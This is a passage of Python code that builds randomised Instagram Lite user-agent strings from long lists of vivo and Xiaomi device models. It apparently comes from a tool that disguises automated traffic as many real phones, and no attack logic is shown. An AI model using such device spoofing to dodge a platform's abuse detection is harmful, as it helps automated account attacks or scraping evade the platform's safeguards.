                    self.device_model = random.choice(['vivo 1002T', 'Vivo 1605', 'vivo 1730', 'vivo 1809', 'vivo_1820', 'vivo 1835', 'vivo 1914', 'vivo 2010', 'vivo 2019', 'vivo 2019', 'vivo 2019', 'vivo 2023', 'vivo 2027', 'vivo 3969', 'VIVO 5', 'Vivo 6', 'Vivo 7 Pro', 'Vivo 8', 'Vivo 93K Prime', 'vivo A5 ', 'vivo a54', 'Vivo A54', 'vivo a57', 'Vivo A87', 'VIVO A94', 'VIVO AIR', 'VIVO C8818', 'vivo E1', 'vivo E3', 'vivo E3', 'vivo E5', 'Vivo EGO', 'V1962BA', 'vivo h5', 'V1824A', 'V1824A', 'V1824BA', 'V2217A', 'V2217A', 'V2218A', 'V2218A', 'V2218A', 'V2243A', 'V1955A', 'I1927', 'I1928', 'V2024A', 'V2025A', 'V2025A', 'V2049A', 'V2049A', 'I2009', 'I2012', 'I2012', 'V2136A', 'V2136A', 'V2141A', 'V2171A', 'I2017', 'V2172A', 'V2172A', 'I2022', 'I2019', 'I2019', 'I2201', 'V1914A', 'V1914A', 'V1981A', 'V2055A', 'V2118A', 'V2157A', 'V2157A', 'V2154A', 'V2196A', 'V2196A', 'V2199A', 'V2231A', 'V2238A', 'V1936AL', 'V1936A', 'V1922A', 'V1922A', 'V1922A ', 'V1916A', 'V2023A', 'V2023A', 'VIVO V2023A', 'V2065A', 'V2061A', 'V2061A', 'V2143A', 'V2106A', 'V2165A', 'V2165A', 'V2180GA', 'V1986A', 'V2012A', 'V2012A', 'V2073A', 'V2073A', 'I2011', 'V2148A', 'I2018', 'V1919A', 'V2131A', 'V2220A', 'I2202', 'I2206', 'I2203', 'I2202', 'I2127', 'I2202', 'I2208', 'I2208', 'I2126', 'I2126', 'I2126', 'V2164KA', 'V2164KA', 'VIVO IV', 'VIVO IV', 'VIVO IV', 'VIVO IV', 'Vivo J5', 'vivo 1805', 'vivo 1805', 'vivo NEX', 'V1923A', 'vivo 1912', 'V1923A', 'vivo 1912', 'vivo 1913', 'V1924A', 'V1924A', 'vivo 1913', 'V1950A', 'V1950A', 'vivo NEX A', 'vivo NEX A', 'vivo 1813', 'V1821A', 'V1821A', 'vivo NEX S', 'vivo NEX S', 'Vivo ONE', 'Vivo ONE', 'PA2170', 'vivo PD1628F_EX', 'vivo PD1709', 'vivo PD1709F_EX', 'vivo PD1709F_EX', 'vivo PD1728', 'vivo PD1728', 'vivo PD1832F_EX', 'vivo PD2046F_EX', 'vivo PD2050F_EX', 'vivo PD2055F_EX', 'vivo PD2059F_EX', 'Vivo S', 'V1831A', 'V1831A', 'VIVO S1', 'Vivo S1 Prime', 'V1832A', 'V1832T', 'V2121A', 'V2121A', 'V2130A', 'V2130A', 'Vivo S11', 'Vivo S11 ', 'vivo S11t', 'vivo S11t', 'vivo S11t', 'vivo S11t', 'vivo S12', 'V2162A', 'Vivo S13', 'V2203A', 'V2207A', 'V2190A', 'V2244A', 'vivo S1Pro', 'Vivo S20 ', 'Vivo S21 ', 'Vivo S31', 'Vivo S4', 'Vivo S40', 'Vivo S41 /MMB439M', 'V1932A', 'vivo S6', 'V1962A', 'vivo S6T', 'V2020CA', 'V2020A', 'Vivo S76', 'V2031EA', 'vivo S7i(t)', 'vivo S7i(t)', 'vivo S7i(t)', 'V2080A', 'vivo S7t', 'vivo_S7t', 'vivo S7t', 'S7t 5G', 'vivo S7w', 'vivo S8', 'vivo S9', 'vivo S9', 'vivo S9', 'V2072A', 'V2048A', 'vivo S9t', 'V2168', 'V2168', 'V2153', 'V2153', 'V2150', 'V2151', 'V2151', 'V2151', 'V2143', 'vivo TD1602_EX', 'vivo U1', 'vivo 1916', 'vivo 1916', 'vivo 1921', 'V1941A', 'V1941A', 'V1928A', 'vivo V1', 'vivo V1', 'vivo V10', 'Vivo V10', 'VIVO V11', 'Vivo V11', 'vivo 1804', 'vivo 1804', 'vivo 1806', 'vivo 1806', 'vivo v11pro', 'vivo 1819', 'vivo 1818', 'vivo 1818', 'vivo 1920', 'vivo 1919', 'vivo 1907', 'vivo 1907', 'vivo 1907_19', 'vivo 1910', 'vivo 1909', 'vivo 1910', 'vivo 1933', 'vivo 1933', 'vivo V1907', 'vivo v19neo', 'vivo V1Max', 'vivo V1Max', 'vivo V2', 'V2040', 'vivo 2018', 'vivo 2018', 'V2022', 'Vivo V20A', 'Vivo V20G', 'V2066', 'V2108', 'V2050', 'V2050', 'V2050', 'V2061', 'V2055', 'Vivo V21S', 'V2130', 'V2132A', 'V2116', 'V2115', 'V2116', 'V2116', 'V2126', 'V2126', 'V2228', 'V2228', 'V2158', 'V2158', 'V2202', 'V2202', 'V2201', 'V2246', 'V2230', 'V2230', 'V2237', 'vivo V3', 'vivo V3', 'vivo V3Max A', 'vivo V3Max L', 'vivo v30', 'vivo v31', 'vivo V3L', 'vivo V3L', 'vivo V3L', 'vivo V3L', 'vivo V3M A', 'vivo V3M A', 'vivo V3MA', 'vivo_V3Max', 'vivo v45', 'vivo 1601', 'vivo V5', 'vivo 1609', 'vivo 1611', 'Vivo V51', 'Vivo V54', 'vivo 1612', 'vivo 1713', 'vivo V5S A', 'vivo 1718', 'vivo 1716', 'vivo Y79A', 'vivo Y79A', 'V2166BA', 'Vivo V8', 'vivo 1723', 'vivo V9 mini', 'vivo 1851', 'VIVO V9Pro', 'vivo 1851', 'vivo 1727', 'Vivo X', 'V2178A', 'V2229A', 'V2170A', 'V2170A', 'vivo Xplay3S', 'vivo Xplay3S', 'vivo Xplay3S', 'vivo Xplay5A', 'vivo Xplay5A', 'vivo Xplay5A', 'vivo Xplay5S', 'vivo Xplay5S', 'vivo Xplay6', 'vivo Xplay6L', 'vivo Xplay6', 'vivo Xplay6', 'vivo X710L', 'vivo X710L', 'vivo X710L', 'vivo X710L', 'vivo X1', 'vivo X1', 'vivo X1', 'vivo X1', 'Vivo X11', 'vivo X1S', 'vivo X1S', 'vivo X1S', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1W', 'vivo X1w', 'VIVO X2', 'VIVO X2', 'VIVO_X2', 'vivo X20', 'vivo X20A', 'vivo X20Plus A', 'vivo 1720', 'vivo X20Plus UD', 'vivo X20Plus UD', 'vivo X21', 'vivo X21A', 'vivo X21UD A', 'vivo X21i', 'vivo X21i A', 'vivo X21i', 'vivo X21i A ', 'V1814A', 'V1814T', 'V1814T', 'V1814A', 'V1809A', 'V1809A', 'V1816A', 'V1809T', 'V1816T', 'V1829A', 'V1838A', 'V1838T', 'V1829T', 'V1836A', 'V1836A', 'V1836T', 'vivo X27Pro', 'V1938CT', 'V1938T', 'V1938T', 'vivo X3F', 'vivo X3F', 'vivo X3F', 'vivo X3L', 'vivo X3L', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S W', 'vivo X3S W', 'vivo X3S W', 'vivo X3S W', 'vivo X3t', 'vivo X3t', 'vivo X3t', 'vivo X3t', 'vivo X3V', 'vivo X3V', 'vivo X3V', 'vivo X3V', 'Vivo X40', 'vivo X5L', 'vivo X5', 'vivo X5L', 'vivo X5Pro D', 'vivo X5Pro L', 'vivo X5Pro V', 'vivo X5Pro D', 'vivo X5Pro D', 'V2001A', 'V2001A', 'vivo 2004', 'vivo 2005', 'vivo 2005', 'V1937', 'vivo 1937', 'V1937', 'V1937', 'vivo 2006', 'vivo 2006', 'V2005A', 'V2011A', 'X50 Pro+', 'V1930', 'V1930', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X520L', 'vivo X5F', 'vivo X5M', 'vivo X5M', 'vivo X5M', 'vivo X5Max ', 'vivo X5Max L', 'vivo X5Max L', 'vivo X5Max S', 'vivo X5Max V', 'vivo X5S L', 'vivo X5S L', 'vivo X5V', 'vivo X5V', 'vivo X5V', 'vivo X6D', 'vivo X6A', 'vivo X6Plus D', 'vivo X6Plus A', 'vivo X6Plus L', 'vivo X6Plus D', 'vivo X6Plus A', 'vivo X6Plus D', 'vivo X6Plus L', 'V2046A', 'V2059A', 'V2046A', 'V2045', 'V2046', 'V2047A', 'V2056A', 'V2085A', 'vivo X6S A', 'vivo X6S A', 'vivo X6S A', 'vivo X6S A', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus A', 'vivo X7L', 'vivo X7Plus', 'vivo X7Plus', 'V2133A', 'V2104', 'V2104', 'V2105', 'V2134A', 'V2105', 'V2145A', 'V2114', 'V2145A', 'vivo X710F', 'vivo X710F', 'vivo X710F', 'vivo X710F', 'V2144', 'V2183A', 'V2144', 'V2208', 'V2185A', 'V2145', 'V2185A', 'Vivo X83', 'vivo X9', 'vivo X9L', 'vivo X9', 'vivo X9', 'vivo X9Plus', 'vivo X9Plus L', 'V2241A', 'V2242A', 'V2242A', 'V2227A', 'vivo X9i', 'vivo X9i', 'vivo X9i', 'vivo X9s', 'vivo X9s L', 'vivo X9s Plus', 'vivo X9s Plus', 'vivo X9s Plus L', 'vivo X9s Plus', 'VIVO XL', 'vivo Xplay', 'vivo Xshot', 'vivo Xshot', 'vivo Xshot', 'vivo Xshot', 'V2203', 'V2221', 'Vivo y1', 'Vivo Y1', 'V2168A', 'V2168A', 'vivo 1906', 'V2028', 'vivo Y11t', 'vivo Y11t', 'vivo Y11t', 'vivo 1904', 'V2163A', 'V2102', 'V2102', 'vivo 2007', 'vivo 2007', 'Vivo Y12I Pro', 'V2026', 'V2042', 'V2033', 'V2039', 'V2069', 'V2026_21', 'vivo Y13L', 'vivo Y13', 'vivo Y13L', 'vivo Y13L', 'vivo Y13i', 'vivo_Y13i', 'vivo Y13iL', 'vivo Y13iL', 'vivo Y13T', 'vivo Y13T', 'vivo 1901', 'vivo Y15T', 'vivo Y15T', 'V2134', 'V2147', 'V2147', 'V2212', 'V2120', 'V2204', 'V2214', 'V2204', 'vivo 1902', 'vivo 1902_19', 'VIVO 1902', 'vivo Y17T', 'vivo Y17T', 'vivo_Y17T', 'vivo Y17T', 'vivo Y17W', 'vivo Y17W', 'vivo Y17W', 'vivo Y18L', 'vivo Y18L', 'vivo Y18L', 'vivo 1915', 'vivo Y19t', 'vivo Y19t', 'vivo Y19t', 'vivo Y19t', 'Vivo Y1i', 'vivo 2015', 'vivo 2015', 'V2029', 'V2027', 'V2043_21', 'V2101', 'V2070', 'V2054', 'V2052', 'V2037', 'V2032', 'V2038', 'V2038', 'V2129', 'V2129', 'V2111', 'V2149', 'V2140', 'V2140', 'V2152', 'V2152', 'V2110', 'V2110', 'V2131', 'V2135', 'V2207', 'vivo Y22iL', 'vivo Y22iL', 'V2206', 'V2206', 'vivo Y23L', 'vivo Y23L', 'vivo y23l', 'vivo Y23L', 'vivo Y23L', 'vivo Y23L', 'vivo 1613', 'vivo Y27', 'vivo Y27L', 'vivo Y27', 'vivo Y28', 'vivo Y28', 'vivo Y28L', 'vivo Y28L', 'vivo Y29L', 'vivo Y29L', 'vivo Y29L', 'V1901A', 'V1901A', 'V1901A', 'V1901T', 'V1930A', 'vivo 1938', 'V2034A', 'V2036A', 'V2099A', 'V2099A', 'V2160', 'V2160', 'V2160', 'V2066BA', 'V2066A', 'Y30g', 'Vivo Y30S', 'vivo Y31L', 'V2068', 'V2054A', 'V2068A', 'V2068', 'V2158A', 'Vivo Y32', 'V2180A', 'V2057', 'V2109', 'V2166A', 'V2166A', 'V2146', 'V2205', 'V2205', 'vivo Y37A', 'vivo Y37', 'V2044', 'vivo Y3t', 'vivo Y3t', 'vivo Y3t', 'vivo y41', 'vivo Y5 ', 'Vivo Y5', 'vivo 1935', 'VIVO Y50(2021)', 'V2023EA', 'Y50t', 'V2035', 'vivo Y51L', 'vivo Y51A', 'V2030', 'vivo 1707', 'V2031_21', 'vivo Y51t L', 'vivo Y51t L', 'vivo Y51t L', 'V2053', 'V2057A', 'vivo Y53', 'vivo 1606A', 'vivo Y53n', 'V2058', 'V2123A', 'V2069A', 'V2045A', 'V2045A', 'vivo Y55A', 'V2127', 'V2127', 'vivo 1603', 'vivo Y55n', 'vivo 1610', 'V2164A', 'V2164A', 'V1934A', 'V2006', 'vivo Y613', 'vivo Y613', 'vivo Y613F', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y623', 'vivo Y623', 'vivo Y627', 'vivo Y627', 'vivo Y627', 'vivo Y627', 'vivo Y628', 'vivo Y628', 'vivo 1719', 'vivo Y66', 'vivo Y66L', 'vivo Y66i A', 'vivo Y67', 'vivo Y67A', 'vivo Y67L', 'vivo Y685', 'vivo 1714', 'vivo Y69A', 'V2002A', 'V2002A', 'vivo Y71A', 'vivo 1724', 'vivo Y71A', 'vivo 1801', 'V2041', 'V2060', 'V2102A', 'V1731CA', 'vivo Y73', 'Vivo Y73 /MMB239M', 'V2059', 'V2031A', 'V2164PA', 'V2117', 'vivo Y75A', 'V2142', 'V2142', 'vivo Y75s', 'vivo Y75s', 'vivo Y75S', 'vivo Y75s', 'V2124', 'V2156A', 'V2219A', 'V2219A', 'V2169', 'V2169', 'V1913A', 'vivo 1808i', 'vivo 1803', 'vivo 1803', 'vivo 1812', 'vivo Y81S', 'V1732A', 'V1732T', 'vivo Y83A', 'vivo 1802', 'vivo Y83A', 'vivo Y83A', 'vivo 1726', 'Vivo Y83I', 'vivo Y85A', 'vivo Y85', 'Vivo Y85i', 'Vivo Y86', 'V1730EA', 'vivo v1730ea', 'vivo 1908', 'vivo 1823', 'vivo 1908_19', 'vivo 1817', 'vivo 1811', 'vivo Y913', 'vivo Y913', 'vivo Y91C', 'vivo 1820', 'vivo 1816', 'vivo Y923', 'vivo Y923', 'vivo Y927', 'vivo Y927', 'vivo Y928', 'vivo Y928', 'vivo Y928', 'vivo 1814', 'V1818A', 'V1818A', 'vivo 1814', 'vivo Y937', 'vivo Y937', 'vivo Y937', 'V1818CT', 'V1818CA', 'vivo 1807', 'vivo Y95', 'V1813A', 'V1813T', 'V1813A', 'vivo Y97', 'V1945A', 'V1801A0', 'vivo Z1', 'vivo 1918', 'vivo 1951', 'vivo 1951', 'VIVO Z1Pro', 'vivo 1918', 'vivo 1918 Flow', 'Vivo Z10', 'vivo Z1i', 'V1730DA', 'V1730DT', 'vivo Z1i', 'vivo_1951', 'vivo 1917', 'V1813BA', 'V1813BT', 'V1813BT', 'Vivo Z34', 'vivo Z3x', 'V1730GA', 'vivo Z3x', 'vivo Z3x', 'V1921A', 'V1911A', 'V1911A', 'V1911A', 'V1990A', 'V1990A', 'V1963A', 'V1963A'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; vivo; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Xiaomi':
                    self.android_version = random.choice(['12', '13', '11'])
                    self.device_model = random.choice(['Xiaomi 10 Pro', '2107119DC', '2107119DC', '21091116UI', '21091116UI', '2201123G', '2201123C', 'Xiaomi 12', '2203129G', 'Xiaomi 12 Lite', '2201122G', 'Xiaomi 12 Pro', '2207122MC', '2207122MC', '2206123SC', '2206122SC', 'Xiaomi 12S Pro', '2206122SC', '2203121C', '2203121C', '2203121C', '22071212AG', 'Xiaomi 12T', 'Xiaomi 12T Pro', '22081212UG', 'Xiaomi 12T Pro', '2112123AG', '2211133G', '2211133C', 'Xiaomi 13', 'Xiaomi 13', 'Xiaomi 13', '2210129SG', 'Xiaomi 13 Lite', 'Xiaomi 13 Lite', 'Xiaomi 13 Lite', 'Xiaomi 13 Lite', '2210132C', 'Xiaomi 13 Pro', '2210132G', 'Xiaomi 13 Pro', '2210132C', 'xiaomi 6', 'xiaomi 6', 'xiaomi 8', 'SKR-H0', 'SKR-A0', 'SKW-H0', 'SKW-A0', 'DLT-H0', 'DLT-A0', 'SHARK KLE-A0', 'SHARK KLE-A0', 'Black Shark 3', 'SHARK KLE-A0', 'KLE-AO', 'SHARK KLE-H0', 'SHARK KLE-H0', 'SHARK MBU-A0', 'SHARK MBU-H0', 'SHARK MBU-H0', 'Black Shark 3S', 'SHARK PRS-H0', 'SHARK PRS-H0', 'SHARK PRS-A0', 'SHARK KSR-H0', 'SHARK KSR-A0', 'SHARK PAR-A0', 'SHARK PAR-H0', 'SHARK PAR-H0', 'SHARK KTUS-H0', 'SHARK KTUS-A0', 'SHARK KTUS-H0', 'AWM-A0', 'AWM-A0', 'AWM-A0', '2109119BC', '2109119BC', '2013023', '2013023', '2013023', '2013022', '2013022', '2013023', '2013023', '2014011', '2014011', 'id 2014011', '2014817', '2014817', '2014817', '2014817', '2014817', '2014817', '2014817', '2014818', '2014818', '2014818', '2014818', '2014818', '2014813', '2014811', '2014813', '2014811', '2014812', '2014813', '2014811', '2014813', '2014813', '2014811', '2014811', '2014501', '2014501', '2014501', 'HM NOTE 1TD', 'HM NOTE 1TD', 'Mi 10', 'Mi 10', 'Mi 10', 'M2002J9G', 'M2002J9E', 'M2002J9E', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'M2007J1SC', 'M2007J1SC', 'M2007J1SC', 'M2007J17I', 'M2007J17I', 'M2102J2SC', 'M2102J2SC', 'M2102J2SC', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'M2007J3SY', 'M2007J3SC', 'M2007J3SP', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'M2007J17G', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'M2007J3SG', 'M2011K2G', 'M2011K2C', 'Mi 11', 'Mi 11', 'M2011K2C', 'M2011K2C', 'M2101K9AG', 'M2101K9AG', 'Mi 11 Lite', '2109119DG', 'M2101K9G', 'M2101K9C', '2109119DI', 'M2102K1AC', 'M2102K1AC', 'M2102K1AC', 'M2102K1AC', 'Mi 11 Pro', 'Mi 11 Pro', 'M2102K1C', 'M2102K1C', 'M2102K1C', 'M2102K1G', 'Mi 11 Ultra', 'M2012K11G', 'Mi 11i', '21081111RG', '2107113SG', '2107113SI', 'M2012K11AI', 'M2012K11I', 'M2012K11I', 'MI 1S', 'MI 1S', 'MI 1S', 'MI 2', 'MI 2', 'MI 2A', 'MI 2A', 'MI 2A', 'MI 2A', 'MI 2A', 'MI 2S', 'MI 2S', 'MI 2S', 'MI 2S', 'MI 2SC', 'MI 2SC', 'MI 2SC', 'MI 2SC', 'MI 3', 'MI 3', 'MI 3', 'MI 30 Pro', 'MI 3C', 'MI 3C', 'MI 3C', 'MI 3W', 'MI 3W', 'MI 3W', 'Mi 4', 'MI 4', 'MI 4LTE', 'MI 4LTE', 'MI 4LTE', 'MI 4LTE', 'Mi-4c', 'Mi-4c', 'Mi-4c', 'Mi-4c', 'Mi 4i', 'Mi 4i', 'Mi 4i', 'Mi 4i', 'MI 4S', 'MI 4S', 'arm_64 MI 4S', 'MI 4S', 'MI 4W', 'MI 4W', 'MI 4W', 'MI 4W', 'MI 5', 'Mi 5', 'MI 5', 'MI 5', 'Mi 5C', 'Mi 5c', 'MI 5C', 'MI 5s', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5X Flow', 'MI 5X', 'MI 5X', 'Mi 5X', 'MI 5X', 'MI 6', 'MI 6', 'MI 6', 'MI 6X', 'MI 6X', 'MI 6X', 'MI 6X', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8 Lite', 'MI 8 Lite', 'MI 8 Lite', 'MI 8 Pro', 'MI 8 Pro', 'MI 8 Pro', 'MI 8 SE', 'MI 8 SE', 'MI 8 SE', 'MI 8 SE', 'MI 8 UD', 'MI 8 UD', 'MI 8 UD', 'MI 8 UD', 'MI 9', 'MI 9', 'MI 9', 'MI 9', 'MI 9', 'MI 9', 'Mi 9 Lite', 'Mi9 Pro 5G', 'Mi 9 Pro 5G', 'MI 9 ROY', 'MI 9 SE', 'MI 9 SE', 'Mi 9 SE', 'Mi 9T', 'Mi 9T Pro', 'Mi 9X', 'Mi A1', 'mi a13', 'Mi A2', 'Mi A2 Lite', 'Mi A3', 'Mi A3', 'MI A615FN', 'MiBOX2', 'MIBOX3', 'MiBOX3_PRO', 'MIBOX4', 'Mi CC 9', 'MI CC 9', 'MI CC 9', 'MI CC9 Pro', 'Mi CC9 Pro', 'MI CC9 Pro', 'MI CC9 Pro', 'MI CC 9e', 'MI CC 9e', 'MI CC 9e', 'MI CC 9e', 'MiProjA1', 'MI MAX', 'MI MAX', 'MI MAX', 'MI MAX', 'Mi Max', 'MI MAX', 'MI MAX 2', 'XIAOMI MI MAX 2', 'MI MAX 2', 'MI MAX 2', 'Mi Max 2', 'MI MAX 3', 'MI MAX 3', 'Mi Max 3', 'MIX', 'MIX', 'MIX Lite', 'MIX', 'Mix Plus', 'MIX 2', 'MIX 2', 'MIX 2', 'Mi MIX 2', 'MIX 2', 'Mi MIX 2S', 'MIX 2S', 'MIX 2S', 'MIX 2S', 'MIX 2S', 'Mi MIX 2S', 'Mi MIX 3', 'MIX 3', 'Mi MIX 3 5G', 'Mi MIX 3 5G', 'Mi MIX 3 5G', 'Mi MIX 3 5G', 'Mi MIX 3 5G', '2106118C', '2106118C', 'M2011J18C', 'M2011J18C', 'M2011J18C', 'M2011J18C', 'Mi Note 10', 'Mi Note 10 Lite', 'Mi Note 10 Pro', 'Mi Note 11', 'Mi Note 2', 'MI Note 2', 'Mi Note 2', 'Mi Note 2', 'Mi Note 2', 'Mi Note 2', 'Mi Note 3', 'Mi Note 8 Pro', 'MI NOTE LTE', 'MI NOTE LTE', 'MI NOTE LTE', 'MI NOTE LTE', 'MI NOTE Pro', 'Mi Note Pro', 'MI NOTE Pro', 'MI NOTE Pro', 'MI NOTE Pro', 'Mi Note10 Pro', 'Mi Note5', 'MI-ONE', 'MI-ONE C1', 'MI-ONEPlus', 'MI-ONE Plus', 'Mi Pad 4Plus', 'MI PAD', 'MI PAD 2', 'MI PAD 2', 'MiPad 3', 'MI PAD 3', 'MI PAD 4', 'MI PAD 4 PLUS', 'MI PAD 4 PLUS', 'Xiaomi Pad 5', 'Xiaomi Pad 5', '21051182G', '21051182C', 'Xiaomi Pad 5', 'M2105K81AC', 'M2105K81AC', 'M2105K81AC', '22081281AC', 'M2105K81C', 'M2105K81C', 'Mi Pad4 Wi-Fi', 'Mi Pad5 Wi-Fi', 'MI PLAY', 'MI PLAY Flow', 'MI PLAY', 'MI PLAY', 'MI PLAY', 'MI XL', 'Xiaomi Mi5', 'MiTV-AXSO0', 'MiTV4A', 'MiTV4-ANSM0', 'MiTV-MSSP0', 'MiTV-AXSO1', 'MiTV-AXSO2', 'MiTV4C', 'MiTV4I', 'MiTV4I', 'MiTV-MSSP2', 'MiTV-MSSP1', 'MiTV-MSSP3', 'MiTV-MOOQ0', 'MiTV-MOOQ0', 'MiTV-MTEQ0', 'MiTV-AESP0', 'MiTV-AYFR0', 'MiTV-ANSP0', 'MiTV-ANSP0', '22061218C', '22061218C', '22061218C', '22061218C', '22061218C', '2209116AG', 'POCOPHONE F1', 'POCO F1', 'Qin 1s+', 'Qin 2', 'QIN2 Pro', 'Qin 2 Pro', 'Redmi 01A', 'HM 1', '21061119DG', '220333QBI', 'Redmi 10', 'Redmi 10', '21061119AG', '21121119SG', '22011119UY', '22041219NY', '22041219G', 'Redmi 10 5G', '21061119BI', '22011119TI', '22041219I', '220233L2G', '220233L2I', '220333QNY', '220333QAG', '220333QL', 'Redmi 10I', 'Redmi 10S', 'M2004J7AC', 'M2004J7AC', 'M2004J7AC', 'M2004J15SC', 'M2004J7BC', 'M2004J7BC', 'M2004J7BC', 'Redmi 11 Lite', 'Redmi 11 lite', '22071219AI', '22071219AI', 'Redmi 11X', 'Redmi 12 5G', 'Redmi 12', '22120RN86G', '22126RN91Y', 'Redmi 12C', '2212ARNC4L', 'Redmi 12C', 'HM 1S', 'HM 1SW', 'Redmi 1S', 'HM 1SW', 'HM 1SC', 'HM 1S', 'HM 1S', 'HM 1S', 'HM 1S', 'HM 1SW', 'wt88047', 'Redmi 2', 'Redmi 2 Prime', 'wt88047', 'wt88047', 'HM 2A', 'HM 2A', 'HM 2A', 'Redmi 3', 'Redmi 3', 'Redmi 3', 'Redmi 3', 'Redmi 3S', 'Redmi 3S', 'Redmi 3S', 'Redmi 3X', 'Redmi 3X', 'Redmi 3X', 'Redmi 3X', 'Redmi 4', 'Redmi 4 Prime', 'Redmi 4 Pro', 'Redmi 4 Pro', 'Redmi 41224', 'Redmi 4A', 'Redmi 4A', 'Redmi 4A', 'Redmi 4A', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5 Plus', 'Redmi 5 Plus', 'Redmi 5 pro', 'Redmi 5A', 'Redmi 5pro', 'Redmi 5S', 'Redmi 6', 'Redmi 6', 'Redmi 6', 'Redmi 6 Pro', 'Redmi 6 Pro', 'Redmi 6A', 'Redmi 7', 'Redmi 7 Pro', 'Redmi 7A', 'Redmi 7A', 'Redmi 7I', 'Redmi 7i', 'Redmi 8', 'Redmi 85781', 'Redmi 8A', 'Redmi 8A Dual', 'Redmi 8A Pro', 'Redmi 8A Pro', 'Redmi 8A Pro', 'Redmi 8A Pro', 'M2004J19C', 'M2010J19SI', 'Redmi 9 Power', 'Redmi 9 Prime', 'Redmi 9 Prime', 'Redmi 9 Pro', 'Redmi 99070', 'M2006C3LG', 'M2006C3LI', 'M2006C3LVG', 'M2006C3MG', 'M2006C3MT', 'M2006C3MNG', 'M2006C3LII', 'Redmi 9i', 'Redmi 9Prime', 'Redmi 9pro', 'M2010J19SY', 'M2010J19SG', 'M2010J19SL', 'Redmi 9T NFC', '220733SG', '220733SL', '220733SFG', '23028RN4DG', '23028RNCAG', 'Redmi A3', 'Redmi A8', 'Redmi A90', 'Redmi Go', 'Redmi K20', 'Redmi K20', 'Redmi K20 Pro', 'Redmi K20 Pro', 'Redmi K20 Pro', 'Redmi K20 Pro', 'Redmi K30', 'Redmi K30', 'Redmi K30', 'Redmi K30', 'Redmi K30', 'Redmi K30 5G', 'Redmi K30 5G', 'Redmi K30 5G', 'Redmi K30 5G', 'Redmi K30 Pro', 'Redmi K30 Pro', 'M2006J10C', 'M2006J10C', 'M2006J10C', 'M2006J10C', 'Redmi K30i 5G', 'Redmi K30i 5G', 'Redmi K30i 5G', 'Redmi K30i 5G', 'M2012K11AC', 'M2012K11AC', 'M2012K11AC', 'M2012K10C', 'M2012K10C', 'M2012K10C', 'M2012K11C', 'M2012K11C', 'M2012K11C', '22021211RC', '22021211RC', '22041211AC', '22041211AC', '22041211AC', '22041211AC', '22041211AC', '22011211C', '22011211C', '22011211C', '21121210C', '21121210C', '21121210C', '21121210C', '22041216I', '23013RK75C', '23013RK75C', 'Redmi K60', '22127RK46C', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'M2101K7AG', 'M2101K7AI', 'M2103K19G', 'M2103K19C', 'XIG02', 'M2101K6G', 'M2104K10AC', 'M2101K6R', 'M2101K7BG', 'M2101K7BNY', 'M2101K7BL', 'M2101K7BI', '22021119KR', 'M2103K19Y', 'Redmi Note 10T', 'M2103K19I', 'A101XM', 'M2003J15SC', 'M2003J15SC', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', '2201117TY', '2201117TG', '2201117TI', '2201117TL', '21091116AC', '21091116AC', '21091116AC', '2201116TG', '21091116C', '2201116TI', '2201116TG', '21091116C', '2201116SG', '2201116SR', '21091116UG', '21091116UC', '2201116SI', '22087RA4DI', '22087RA4DI', '22041219C', '22041219C', 'Redmi Note 11E', '2201116SC', 'Redmi Note 11R', 'Redmi Note 11R', '22095RA98C', '2201117SL', '2201117SY', '2201117SI', '2201117SG', '22031116BG', '21091116I', '21091116AI', '22041216C', '22041216C', '22041216C', '22041216C', '22041216C', '22041216UC', '22041216UC', '22041216UC', '22111317G', '23021RAAEG', '23021RAA2Y', 'Redmi Note 12', 'Redmi Note 12', 'Redmi Note 12', '22101316UP', '22101316G', '22101316I', '22101316C', '22101316C', '22101316UC', '22101316UCP', '22101316UCP', '22101316UCP', '22101316UCP', '22101316UG', '2303CRA44A', 'Redmi Note 12S', '23030RAC7Y', 'Redmi Note 12S', 'Redmi Note 12S', 'Redmi Note 12S', '23049RAD8C', '23049RAD8C', 